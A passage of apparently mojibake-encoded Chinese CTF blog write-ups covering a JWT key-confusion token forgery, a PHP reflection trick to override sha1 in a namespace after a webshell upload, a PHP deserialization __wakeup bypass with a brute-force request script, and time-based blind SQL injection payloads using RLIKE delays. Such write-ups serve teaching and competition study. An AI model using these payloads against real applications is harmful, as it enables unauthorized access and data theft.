wpï¼Œè€ƒç‚¹æ˜¯æ³¨å…¥ï¼Œè¿‡æ»¤äº†åœ†æ‹¬å·ï¼Œæ³¨é‡Šç¬¦ï¼Œfromç­‰ç­‰\npayload ï¼šorder by æ’åºç›²æ³¨\nWeb6 http://39.100.83.188:8053/\næµ‹è¯•å‘ç°ä¸€äº›ç‰¹æ®Šç¬¦å·è¢«è½¬ä¹‰\n!@#$%^\u0026amp;amp;*()_+-={}|[]\\\\:\\\u0026quot;;'\u0026amp;lt;\u0026amp;gt;?,./ ç„¶åå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨\u0026hellip;\nç„¶åå‘ç°æœ‰ jwt ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¸‹å¹¶æ²¡ä»€ä¹ˆï¼Œå‚è€ƒäº†JSON Web Token (JWT) æ”»å‡»æŠ€å·§ï¼Œè¯•äº†å‡ ç§æ–¹å¼ï¼Œæ”¹åŠ å¯†ç®—æ³•ä¸º none æ²¡ç”¨ï¼Œåˆæ²¡æœ‰å…¬é’¥\u0026hellip;\nç„¶åç»ˆäºåœ¨ http://39.100.83.188:8053/static/js/common.js ä¸­å‘ç°äº†\nfunction getpubkey(){ /* get the pubkey for test /pubkey/{md5(username+password)} */ } è¿™ä¸ªæ²¡æœ‰ç”¨åˆ°çš„å‡½æ•°ï¼Œè¿˜ä»¥ä¸ºå…¬é’¥æ˜¯ç”¨md5(username+password)ï¼Œç»“æœå‘ç°è¿™æ˜¯ä¸ª url \u0026hellip;\nè®¿é—® http://39.100.83.188:8053/pubkey/9af8bd54cb8f00ac47d6050c99a5494b å¾—åˆ°\n{\u0026quot;pubkey\u0026quot;:\u0026quot;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----\u0026quot;,\u0026quot;result\u0026quot;:true} æ‹¿ä¸Šé¢é‚£ç¯‡å…ˆçŸ¥æ–‡ç« çš„ exp å‡ºæ¥æ”¹ä¸€ä¸‹\nimport jwt public = \u0026#39;\u0026#39;\u0026#39;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----\u0026#39;\u0026#39;\u0026#39; print public print jwt.encode({\u0026#34;name\u0026#34;:\u0026#34;zeddy\u0026#34;,\u0026#34;priv\u0026#34;:\u0026#34;admin\u0026#34;}, key=public, algorithm=\u0026#39;HS256\u0026#39;) è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœè¦ç”¨è¿™ä¸ª exp å¿…é¡»å¾—ç”¨pyjwt==0.4.3ï¼Œè€Œä¸” python è¿˜æœ‰ä¸ªåº“ä¹Ÿå« jwt â€¦è¿™é‡Œéœ€è¦ç”¨ python2 æŠŠä¸¤ä¸ªjwt/PyJWTéƒ½å¸äº†ï¼Œç„¶åè£…ä¸Šé¢é‚£ä¸ªå°±è¡Œäº†ã€‚\nç”¨è¿™ä¸ª jwt è®¿é—®/listå°±å¯ä»¥å¾—åˆ° admin çš„ pastebin äº†ï¼Œè®¿é—®å³æ˜¯ flag\n","date":"2019-05-30T10:41:10Z","permalink":"https://blog.zeddyu.info/2019/05/30/2019iscc/","title":"2019 ISCC Web wp"},{"content":"å›½èµ›ä¸­ RefSpace é‚£é“é¢˜çš„ wp ä¸ç ”ç©¶ã€‚\n[TOC] å›½èµ› day2 å‡ºç°äº†ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„é¢˜ï¼Œæœ€åè²Œä¼¼åªæœ‰5äººèƒ½è§£å‡ºã€‚èµ›æ—¶æˆ‘å°è¯•é€šè¿‡è¦†å†™å‡½æ•°æ¥å®ç°ç›´æ¥ getFlag ï¼Œæœ€åå‘ç°è‡ªå·±è¿˜æ˜¯å¤ªå¹´è½»äº†ï¼Œé¢„æœŸè§£åº”è¯¥å°±æ˜¯é€šè¿‡ php åå°„ç±»æ¥è¦†å†™ namespace ä¸­çš„sha1()å‡½æ•°æ¥è¾¾åˆ° getFlagã€‚\næ‰€ä»¥æ•´ä¸ªé¢˜è§£é¢˜æ€è·¯å¤§è‡´æ˜¯ï¼š\n é€šè¿‡ phar/zip åè®®ï¼Œç»•è¿‡ä¸Šä¼ ç‚¹æ‹¿åˆ° webshell é€šè¿‡ php åå°„ç±»è¦†å†™ sha1 å‡½æ•° getFlag è®©æˆ‘ä»¬é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹ php åå°„  Reflection {% colorquote success %}\nPHP 5 å…·æœ‰å®Œæ•´çš„åå°„ APIï¼Œæ·»åŠ äº†å¯¹ç±»ã€æ¥å£ã€å‡½æ•°ã€æ–¹æ³•å’Œæ‰©å±•è¿›è¡Œåå‘å·¥ç¨‹çš„èƒ½åŠ›ã€‚ æ­¤å¤–ï¼Œåå°„ API æä¾›äº†æ–¹æ³•æ¥å–å‡ºå‡½æ•°ã€ç±»å’Œæ–¹æ³•ä¸­çš„æ–‡æ¡£æ³¨é‡Šã€‚\nè¯·æ³¨æ„éƒ¨åˆ†å†…éƒ¨ API ä¸¢å¤±äº†åå°„æ‰©å±•å·¥ä½œæ‰€éœ€çš„ä»£ç ã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ªå†…ç½®çš„ PHP ç±»å¯èƒ½ä¸¢å¤±äº†åå°„å±æ€§çš„æ•°æ®ã€‚è¿™äº›å°‘æ•°çš„æƒ…å†µè¢«è®¤ä¸ºæ˜¯é”™è¯¯ï¼Œä¸è¿‡ï¼Œ æ­£å› ä¸ºå¦‚æ­¤ï¼Œå®ƒä»¬åº”è¯¥è¢«å‘ç°å’Œä¿®å¤ã€‚\n{% endcolorquote %}\nåå°„ï¼Œç›´è§‚ç†è§£å°±æ˜¯æ ¹æ®åˆ°è¾¾åœ°æ‰¾åˆ°å‡ºå‘åœ°å’Œæ¥æºã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªå…‰ç§ƒç§ƒçš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä»…ä»…é€šè¿‡è¿™ä¸ªå¯¹è±¡å°±èƒ½çŸ¥é“å®ƒæ‰€å±çš„ç±»ã€æ‹¥æœ‰å“ªäº›æ–¹æ³•ã€‚\nGET åœ¨Reflection Classä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆå¤šæ¯”è¾ƒæœ‰è¶£çš„ api ï¼Œä¾‹å¦‚ getProperties\nå®˜æ–¹æ–‡æ¡£ä¹Ÿç»™å‡ºäº†ä¾‹å­ï¼š\n\u0026lt;?php class Foo { public $foo = 1; protected $bar = 2; private $baz = 3; } $foo = new Foo(); $reflect = new ReflectionClass($foo); $props = $reflect-\u0026gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PROTECTED); foreach ($props as $prop) { print $prop-\u0026gt;getName() . \u0026#34;\\n\u0026#34;; } var_dump($props); ?\u0026gt;OutPut:\nfoo bar array(2) { [0]=\u0026gt; object(ReflectionProperty)#3 (2) {  [\u0026#34;name\u0026#34;]=\u0026gt; string(3) \u0026#34;foo\u0026#34; [\u0026#34;class\u0026#34;]=\u0026gt; string(3) \u0026#34;Foo\u0026#34; } [1]=\u0026gt; object(ReflectionProperty)#4 (2) {  [\u0026#34;name\u0026#34;]=\u0026gt; string(3) \u0026#34;bar\u0026#34; [\u0026#34;class\u0026#34;]=\u0026gt; string(3) \u0026#34;Foo\u0026#34; } } è¯»å–ç§æœ‰æˆå‘˜å˜é‡ å¦‚æœæƒ³è¦è¾“å‡ºç§æœ‰å˜é‡ï¼Œå°±åŠ ä¸ŠReflectionProperty::IS_PRIVATEå³å¯ã€‚\næ‰§è¡Œç§æœ‰å‡½æ•° æ—¢ç„¶å¯ä»¥æ‹¿åˆ°ç±»æˆå‘˜çš„å€¼ï¼Œé‚£ä¹ˆå‡½æ•°è¿”å›å€¼èƒ½ä¸èƒ½æ‹¿åˆ°å‘¢ï¼Ÿ\nå½“ç„¶æ˜¯å¯ä»¥çš„\nclass Foo { private function showFlag(){ return \u0026#39;This is not flag\u0026#39;; } } $reflectionMethod = new ReflectionMethod(\u0026#39;Foo\u0026#39;, \u0026#39;showFlag\u0026#39;); $reflectionMethod-\u0026gt;setAccessible(true); echo $reflectionMethod-\u0026gt;invoke(new Foo()); OutPut:\nThis is not flag SET ä¿®æ”¹ç±»çš„æˆå‘˜å˜é‡ åˆ©ç”¨ReflectionProperty::setValueå¯ä»¥ä¿®æ”¹æˆå‘˜å˜é‡ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ç»™å‡ºç¤ºä¾‹ï¼Œè¿™é‡Œä¹Ÿç»™ä¸€ä¸ªä¾‹å­ï¼Œä¿®æ”¹ private æˆ–è€… protected ç±»å‹çš„å˜é‡ä¹Ÿè¦åŠ ä¸ŠsetAccessible(true)ï¼Œå¦åˆ™ä¼šæŠ¥é”™\nclass Foo { public $foo = 1; protected $bar = 2; private $baz = 3; } $foo = new Foo(); $reflect = new ReflectionClass($foo); //change foo fron 1 to 5 $reflect-\u0026gt;getProperty(\u0026#39;foo\u0026#39;)-\u0026gt;setValue($foo, \u0026#39;5\u0026#39;); //change baz from 3 to 4 $baz = $reflect-\u0026gt;getProperty(\u0026#39;baz\u0026#39;); $baz-\u0026gt;setAccessible(true); $baz-\u0026gt;setValue($foo, \u0026#39;4\u0026#39;); //Output $props = $reflect-\u0026gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PROTECTED | ReflectionProperty::IS_PRIVATE); foreach ($props as $prop) { $prop-\u0026gt;setAccessible(true); print $prop-\u0026gt;getName() . \u0026#34;\\n\u0026#34;; print $prop-\u0026gt;getValue($foo).\u0026#34;\\n\u0026#34;; } Output:\nfoo 5 bar 2 baz 4 ä¿®æ”¹å‡½æ•°è¿”å›å€¼ å¹¶ä¸èƒ½ç›´æ¥ä¿®æ”¹å‡½æ•°è¿”å›å€¼\nNamespace è¿™é‡Œç®€å•æä¸€ä¸‹ php ä¸­çš„ namespace å‘½åç©ºé—´ï¼Œç®€å•æ¥è¯´ php å‘½åç©ºé—´ä¸ºäº†è§£å†³çš„å°±æ˜¯è¦†å†™ php å†…éƒ¨å‡½æ•°çš„é—®é¢˜ï¼Œè¯¦ç»†å¯ä»¥å‚è€ƒå‘½åç©ºé—´æ¦‚è¿°ã€‚\nä¸¾ä¸ªä¾‹å­ï¼š\nnamespace Foo; function sha1($key){ return \u0026#34;This is Foo sha1\u0026#34;; } var_dump(sha1(\u0026#39;1\u0026#39;)); var_dump(\\sha1(\u0026#39;1\u0026#39;)); Output:\n/test.php:6:string \u0026#39;This is Foo sha1\u0026#39; (length=18) /test.php:7:string \u0026#39;356a192b7913b04c54574d18c28d46e6395428ab\u0026#39; (length=40) RefSpace æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªé¢˜ï¼Œé¦–å…ˆé€šè¿‡ä¸€ç³»åˆ—æ“ä½œ getshell ï¼Œå‚è€ƒ zipæˆ–pharåè®®åŒ…å«æ–‡ä»¶ï¼Œè¿™é‡Œå°±ç•¥è¿‡äº†ï¼Œéƒ½æ˜¯é‡å¤æ€§ç®€å•çš„æ“ä½œï¼Œå¾—åˆ°ä»¥ä¸‹æºç \napp/index\n\u0026lt;?php if (!defined(\u0026#39;LFI\u0026#39;)) { echo \u0026#34;Include me!\u0026#34;; exit(); } ?\u0026gt;\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Hi CTFer,\u0026lt;br /\u0026gt; è¿™æ˜¯ä¸€ä¸ªéå¸¸éå¸¸ç®€å•çš„SDKæœåŠ¡ï¼Œå®ƒçš„ä»»åŠ¡æ˜¯ç»™å„ä½å¤§ä½¬\u0026lt;!--é¼ --\u0026gt;æä¾›flag\u0026lt;br /\u0026gt; Powered by Aoisystem\u0026lt;br /\u0026gt; \u0026lt;!-- error_reporting(E_ALL); --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; app/Up10aD\n\u0026lt;?php if (!defined(\u0026#39;LFI\u0026#39;)) { echo \u0026#34;Include me!\u0026#34;; exit(); } if (isset($_FILES[\u0026#34;file\u0026#34;])) { $filename = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $fileext = \u0026#34;.gif\u0026#34;; switch ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;]) { case \u0026#39;image/gif\u0026#39;: $fileext = \u0026#34;.gif\u0026#34;; break; case \u0026#39;image/jpeg\u0026#39;: $fileext = \u0026#34;.jpg\u0026#34;; break; default: echo \u0026#34;Only gif/jpg allowed\u0026#34;; exit(); } $dst = \u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] . $fileext; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $dst); echo \u0026#34;æ–‡ä»¶ä¿å­˜ä½ç½®: {$dst}\u0026lt;br /\u0026gt;\u0026#34;; } ?\u0026gt;\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; æˆ‘ä»¬ä¸èƒ½è®©é€‰æ‰‹è½»è€Œæ˜“ä¸¾çš„æœç´¢åˆ°ä¸Šä¼ æ¥å£ã€‚\u0026lt;br /\u0026gt; å³ä¾¿æ˜¯è¿æ°”å¥½çš„äººç¢°å·§é‡åˆ°äº†ï¼Œæˆ‘ç›¸ä¿¡æˆ‘ä»¬çš„è¿‡æ»¤æ˜¯ä¸‡æ— ä¸€å¤±çš„(æ‰æ€ª \u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;æ¥é€‰æ‹©ä½ çš„æ–‡ä»¶å§:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; index.php\n\u0026lt;?php error_reporting(E_ALL); define(\u0026#39;LFI\u0026#39;, \u0026#39;LFI\u0026#39;); $lfi = $_GET[\u0026#39;route\u0026#39;] ?? false; if (!$lfi) { header(\u0026#34;location: ?route=app/index\u0026#34;); exit(); } include \u0026#34;{$lfi}.php\u0026#34;; //Good job, you know how to use LFI, don\u0026#39;t you? //But You are still far from flag //hint: ?router=app/flag app/flag\n\u0026lt;?php if (!defined(\u0026#39;LFI\u0026#39;)) { echo \u0026#34;Include me!\u0026#34;; exit(); } use interesting\\FlagSDK; $sdk = new FlagSDK(); $key = $_GET[\u0026#39;key\u0026#39;] ?? false; if (!$key) { echo \u0026#34;Please provide access key\u0026lt;br \\\u0026gt;\u0026#34;; echo \u0026#39;$_GET[\u0026#34;key\u0026#34;];\u0026#39;; exit(); } $flag = $sdk-\u0026gt;verify($key); if ($flag) { echo $flag; } else { echo \u0026#34;Wrong Key\u0026#34;; exit(); } //Do you want to know more about this SDK? //we \u0026#39;accidentally\u0026#39; save a backup.zip for more information sdk å¼€å‘æ–‡æ¡£.txt:\næˆ‘ä»¬çš„SDKé€šè¿‡å¦‚ä¸‹SHA1ç®—æ³•éªŒè¯keyæ˜¯å¦æ­£ç¡®: public function verify($key) { if (sha1($key) === $this-\u0026gt;getHash()) { return \u0026#34;too{young-too-simple}\u0026#34;; } return false; } å¦‚æœæ­£ç¡®çš„è¯ï¼Œæˆ‘ä»¬çš„SDKä¼šè¿”å›flagã€‚ PS: ä¸ºäº†èŠ‚çœå„ä½å¤§ä½¬çš„æ—¶é—´ï¼Œç‰¹æ³¨æ˜ 1.æ­¤å¤„å‡½æ•°returnå€¼å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œå’ŒçœŸæ­£çš„flagæ²¡æœ‰å…³ç³»ã€‚ 2.æ­¤å¤„è°ƒç”¨çš„sha1å‡½æ•°ä¸ºPHPè¯­è¨€å†…å»ºçš„hashå‡½æ•°ã€‚(http://php.net/manual/zh/function.sha1.php) 3.æ‚¨æ— é¡»å°è¯•æœ¬åœ°è§£ç æˆ–æœ¬åœ°è¿è¡Œsdk.phpï¼Œå®ƒè¢«é¢„æœŸåœ¨æŒ‡å®šæœåŠ¡å™¨ç¯å¢ƒä¸Šè¿è¡Œã€‚ 4.å‡ ä¹å¤§éƒ¨åˆ†æºç å†…éƒ½æœ‰ä¸€å®šçš„hintï¼Œå¦‚æœæ‚¨æ˜¯é€šè¿‡æ‰«æç›®å½•å‘ç°æœ¬æ–‡ä»¶çš„ï¼Œæ‚¨å¯èƒ½è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ã€‚ æ‰€ä»¥è¿™é‡Œé‡ç‚¹å°±æ˜¯ flag.php äº†ï¼Œä¹‹å‰æˆ‘ä»¬æåˆ°è¿‡å¯ä»¥åœ¨å‘½åç©ºé—´è¦†å†™å‡½æ•°ï¼Œå¯æ˜¯å³ä½¿å¯ä»¥è¦†å†™ï¼Œé‚£è¦æ€ä¹ˆç»•è¿‡verifyè¿™ä¸ªå‡½æ•°å‘¢ï¼Ÿ\nInvoke æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨verifyå‡½æ•°ä¸­ï¼ŒgetHash()å‡½æ•°å¹¶æ²¡æœ‰ä¼ å‚ï¼Œå¾ˆæœ‰å¯èƒ½å°±æ˜¯ç›´æ¥è¿”å›äº†ä¸€ä¸ªå›ºå®šå€¼æˆ–è€…éšæœºå€¼ä»€ä¹ˆçš„ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨åå°„ç±»æ¥æ‰§è¡ŒgetHash()å‡½æ•°ï¼Œè¦†å†™sha1()å‡½æ•°ç»•è¿‡verifyåˆ¤æ–­å‘¢ï¼Ÿ\näºæ˜¯æˆ‘ä»¬å¯ä»¥æ“ä½œä¸€æ³¢\n\u0026lt;?php namespace interesting; class FlagSDK{ private function getHash(){ return \\sha1(\u0026#39;test\u0026#39;); } public function verify($key) { if (sha1($key) === $this-\u0026gt;getHash()) { return \u0026#34;flag{xxx}\u0026#34;; } return false; } } $sdk = new FlagSDK(); function sha1($key){ $reflectionMethod = new \\ReflectionMethod(\u0026#39;interesting\\FlagSDK\u0026#39;, \u0026#39;getHash\u0026#39;); $reflectionMethod-\u0026gt;setAccessible(true); return $reflectionMethod-\u0026gt;invoke(new FlagSDK()); } $flag = $sdk-\u0026gt;verify(\u0026#39;1\u0026#39;); if ($flag) { echo $flag; } else { echo \u0026#34;Wrong Key\u0026#34;; exit(); } åŸºæœ¬æ„é€ å¦‚ä¸Šï¼Œç”±äºç¯å¢ƒå·²ç»å…³äº†ï¼Œåªèƒ½æœ¬åœ°å®ç°ä»¥ä¸‹ï¼Œæ€è·¯å°±æ˜¯ä»¥ä¸Šè¯´çš„é€šè¿‡åå°„ç±»æ¥è¦†å†™ namespace çš„sha1å‡½æ•°æ¥è¾¾åˆ°ç»•è¿‡æ•ˆæœ\nåšé¢˜çš„æ—¶å€™ flag.php æ˜¯æœ‰å†™æƒé™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠsha1ä»£ç å†™å…¥ flag.php å°±å¯ä»¥äº†\nfunction sha1($key){ $reflectionMethod = new \\ReflectionMethod(\u0026#39;interesting\\FlagSDK\u0026#39;, \u0026#39;getHash\u0026#39;); $reflectionMethod-\u0026gt;setAccessible(true); return $reflectionMethod-\u0026gt;invoke(new FlagSDK()); } å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åƒ @zsx å¸ˆå‚…ä¸€æ ·æ‰‹æ’•åŠ å¯† orz \u0026hellip;\nReference ctfä¸­çš„phpåå°„\nROIS CISCN å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›çº¿ä¸Šèµ› Writeup\nç¬¬12å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›Webé¢˜è§£\n","date":"2019-05-09T22:49:10Z","permalink":"https://blog.zeddyu.info/2019/05/09/2019ciscn-RefSpace/","title":"2019 CISCN RefSpace"},{"content":"å›½èµ› Web wp\nDay 1 Web JustSoso Index.php\n\u0026lt;html\u0026gt; \u0026lt;?php error_reporting(0); $file = $_GET[\u0026quot;file\u0026quot;]; $payload = $_GET[\u0026quot;payload\u0026quot;]; if(!isset($file)){ echo 'Missing parameter'.'\u0026lt;br\u0026gt;'; } if(preg_match(\u0026quot;/flag/\u0026quot;,$file)){ die('hack attacked!!!'); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\u0026quot;/flag/\u0026quot;,$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload); }else{ echo \u0026quot;Missing parameters\u0026quot;; } ?\u0026gt; \u0026lt;!--Please test index.php?file=xxx.php --\u0026gt; \u0026lt;!--Please get the source of hint.php--\u0026gt; \u0026lt;/html\u0026gt; Hint.php\n\u0026lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =\u0026gt; $v) { $this-\u0026gt;$k = null; } echo \u0026#34;Waking up\\n\u0026#34;; } public function __construct($handle) { $this-\u0026gt;handle = $handle; } public function __destruct(){ $this-\u0026gt;handle-\u0026gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-\u0026gt;file = $file; $this-\u0026gt;token_flag = $this-\u0026gt;token = md5(rand(1,10000)); } public function getFlag(){ $this-\u0026gt;token_flag = md5(rand(1,10000)); if($this-\u0026gt;token === $this-\u0026gt;token_flag) { if(isset($this-\u0026gt;file)){ echo @highlight_file($this-\u0026gt;file,true); } } } } ?\u0026gt;ä»SugarCRM v6.5.23 PHPååºåˆ—åŒ–å¯¹è±¡æ³¨å…¥æ¼æ´åˆ†æäº†è§£åˆ°å¯ä»¥æŠŠä»¥ä¸‹ payload\nO:6:\u0026quot;Handle\u0026quot;:1: ä¸­çš„ 1 æ”¹æˆæ¯” 1 å¤§çš„æ•°å¯ä»¥åœ¨ååºåˆ—åŒ–æ—¶ç»•è¿‡_warkeupé­”æœ¯æ–¹æ³• ç»•è¿‡$this-\u0026gt;token === $this-\u0026gt;token_flagçš„åˆ¤æ–­å¯ä»¥ç›´æ¥é€šè¿‡çˆ†ç ´æ¥ç»•è¿‡\nè´´ä¸€ä¸‹è„šæœ¬ï¼š\nimport requests import time url =\u0026#34;http://e281a336df8b4ea1b7665704aca7b30246d3cd0663434603.changame.ichunqiu.com///?file=hint.php\u0026amp;payload=O%3A6%3A%22Handle%22%3A3%3A{s%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A{s%3A4%3A%22file%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3Bs%3A10%3A%22token_flag%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3B}}\u0026#34; proxies ={ \u0026#39;http\u0026#39;:\u0026#39;http://127.0.0.1:8080/\u0026#39; } for i in range(1,1000000): rep = requests.get(url) if rep.status_code == 200: if \u0026#39;flag\u0026#39; in rep.text: print(rep.text) else: print(rep.status_code) i = i + 1 time.sleep(1) # rep = requests.get(url) # print(rep.status_code) è¿™é‡Œé¢„æœŸè§£åº”è¯¥æ˜¯å¼•ç”¨ï¼Œåˆ©ç”¨$this-\u0026gt;token_flag = \u0026amp;$this-\u0026gt;tokenï¼Œè¿™æ ·æ¥ç»•è¿‡\nå…¨å®‡å®™æœ€ç®€å•çš„SQL é¡µé¢ä¼šè¿”å›ä¸¤ç§é”™è¯¯ï¼Œä¸€ç§æ˜¯ç™»å½•å¤±è´¥ï¼Œä¸€ç§æ˜¯æ•°æ®åº“æŸ¥è¯¢å¤±è´¥\n \næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨admin'ç­‰æ“ä½œæ¥ fuzz é—­åˆæ–¹å¼ï¼Œå¾—åˆ°å¯ä»¥ä½¿ç”¨å•å¼•å·é—­åˆã€‚ä½†æ˜¯é€šè¿‡ä¸‡èƒ½å¯†ç å¯ä»¥å‘ç°ä¸€äº›å…³é”®å­—è¢«æ›¿æ¢äº†\n \né€šè¿‡ä¸€äº›ç®€å•çš„ fuzz å¯ä»¥å‘ç°æœ‰ä»¥ä¸‹å…³é”®å­—è¢«è¿‡æ»¤äº†\nor || if field elt å¸ƒå°”ç›²æ³¨æ²¡æœ‰å¯ä»¥åŒºåˆ†çš„é¡µé¢å›æ˜¾ï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½ç”¨å¸ƒå°”ç›²æ³¨ï¼ŒæŠ¥é”™æ³¨å…¥ä¹Ÿä¸è¡Œã€‚æ‰€ä»¥åŸºæœ¬ç¡®å®šåªèƒ½ç”¨æ—¶é—´ç›²æ³¨ã€‚\nç»“æœå‘ç°sleep()ã€benchmark()ç­‰å‡½æ•°å‡è¢«è¿‡æ»¤äº†ï¼Œåªèƒ½å¯»æ‰¾ä¸€äº›æ–°çš„å»¶æ—¶æ³¨å…¥çš„æ–¹æ³•ï¼Œåœ¨mysqlç›²æ³¨å¤‡å¿˜å½•ä¸­å‘ç°æ–°çš„æ³¨å…¥æ–¹å¼\nMariaDB [(none)]\u0026gt; select rpad('a',2000000,'a') RLIKE concat(repeat('(a.*)+',30),'b'); +-------------------------------------------------------------+ | rpad('a',2000000,'a') RLIKE concat(repeat('(a.*)+',30),'b') | +-------------------------------------------------------------+ | 0 | +-------------------------------------------------------------+ 1 row in set, 1 warning (0.149 sec) è™½ç„¶æœ¬åœ°æ²¡å¾ˆæ˜æ˜¾å»¶æ—¶ï¼Œä½†æ˜¯æ‰“æœåŠ¡å™¨å‘ç”Ÿäº†æ˜æ˜¾çš„å»¶æ—¶ã€‚æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œæ—¶é—´ç›²æ³¨äº†ã€‚è€Œifåˆè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å°±åªèƒ½é€šè¿‡ä»¥ä¸‹æ–¹å¼å»è§¦å‘å»¶æ—¶\nadmin' and (SELECT length(database()) limit 0,1) = 3 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# æ•°æ®åº“é•¿åº¦ä¸º3\nadmin' and substr((SELECT database() limit 0,1),1,1) = 'c' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and substr((SELECT database() limit 0,1),2,1) = 't' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# admin' and substr((SELECT database() limit 0,1),3,1) = 'f' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# æ•°æ®åº“åå­—ä¸º ctf\nä½†æ˜¯å¦‚æœè¦æ¥ä¸‹å»æ‹¿è¡¨åçš„è¯ä¼ ç»Ÿæ–¹æ³•åªèƒ½å»åˆ©ç”¨information_schemaï¼Œä½†æ˜¯oråˆè¢«è¿‡æ»¤äº†ï¼Œè€Œinformation_schemaä¸­åˆå«æœ‰orï¼Œæ‰€ä»¥è‚¯å®šä¸èƒ½è¡Œã€‚\nè¿‡æ»¤äº†information_schemaåŸºæœ¬ä¸Šæ²¡ä»€ä¹ˆæ›¿ä»£æ–¹å¼äº†ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåªèƒ½å¦è¾Ÿè¹Šå¾„ã€‚\nä¹‹å‰äº†è§£è¿‡å¯ä»¥é€šè¿‡ä¸ç”¨åˆ—åçš„æ–¹å¼æ³¨å…¥ï¼Œæ‰€ä»¥è¿™é‡Œè§‰å¾—åº”è¯¥å¯ä»¥ç›´æ¥è¯»passwordæˆ–è€…ä»€ä¹ˆï¼Œç®¡ä»–è¿™ä¸ªåˆ—åå«å•¥ï¼Œè¯»å°±å¯¹äº†ã€‚æ³¨æ„è¿™é‡Œç”¨offset 1 limit 1è¯»ç¬¬äºŒä¸ªæ‰æ˜¯çœŸæ­£çš„å¯†ç ï¼Œè¿™é‡Œæ—¶é—´ä¸å¤ªå¤Ÿï¼Œä¸´æ—¶ç”¨æ‰‹éªŒè¯äº†å‰å‡ ä½ã€‚çˆ†äº† 4 ä½å¾—åˆ°F1AGï¼Œä»¥ä¸ºå°±æ˜¯å¯†ç 